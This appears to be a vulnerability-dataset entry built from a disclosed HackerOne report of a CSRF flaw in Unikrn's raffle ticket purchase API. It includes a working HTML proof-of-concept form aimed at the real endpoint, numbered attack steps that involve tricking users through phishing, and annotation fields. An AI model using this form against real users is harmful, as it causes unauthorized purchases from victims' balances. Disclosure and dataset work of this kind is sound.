@@ -1,0 +1,38 @@
+{
+    "reported_to": "Unikrn",
+    "reported_by": "tolo7010 ",
+    "title": "CSRF in Raffles Ticket Purchasing",
+    "content": "\nDescription:\nAn API endpoint get executed with no CSRF prevention, the endpoint did not verify session_id required in the post form. An attacker can crafted malicious form (Poc), which is executed by authenticated user action leading to huge balance lost.\nPoc:\nCode 359 Bytes\n1<html>\n2<head>\n3</head> \n4<body>\n5<form action=\"https://unikrn.com/apiv2/raffle/enter\" method=\"POST\" name=\"myForm\">\n6<input type=\"hidden\" name=\"raffle\" id=\"raffle\" value=\"4775\">\n7<input type=\"hidden\" name=\"tickets\" id=\"tickets\" value=\"1\">\n8<input type=\"hidden\" name=\"session_id\" id=\"session_id\" value=\"\">\n9<input value=\"Submit\" type=\"submit\"\">\n10</form>\n11</body>\n12</html>\nRecommendations:\nImplementing CSRF tokens.\nValidate session_id on post form/JSON api input.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-Site Request Forgery (CSRF)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1523340600,
+    "report_url": "https://hackerone.com/reports/272588",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "HIGH",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Create a malicious HTML form that targets the vulnerable API endpoint 'https://unikrn.com/apiv2/raffle/enter' with hidden inputs for 'raffle', 'tickets', and an empty 'session_id'."
+        ],
+        [
+            2,
+            "Trick an authenticated user into submitting this form (e.g., via phishing or malicious site embedding), which will execute the raffle ticket purchase without proper CSRF protection."
+        ]
+    ],
+    "vuln_description": "The vulnerability is a classic CSRF (Cross-Site Request Forgery) flaw where an API endpoint lacks CSRF token validation and fails to verify the session_id in POST requests. This allows attackers to craft malicious forms that, when executed by an authenticated user, can perform unauthorized actions (e.g., purchasing raffle tickets) on behalf of the victim.",
+    "reason": "The vulnerability is straightforward to discover as it involves a basic CSRF attack pattern with no complex interactions or state manipulations. The tester only needed to identify an unprotected POST endpoint and craft a simple HTML form to exploit it. This is a well-documented and common vulnerability pattern in web applications.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
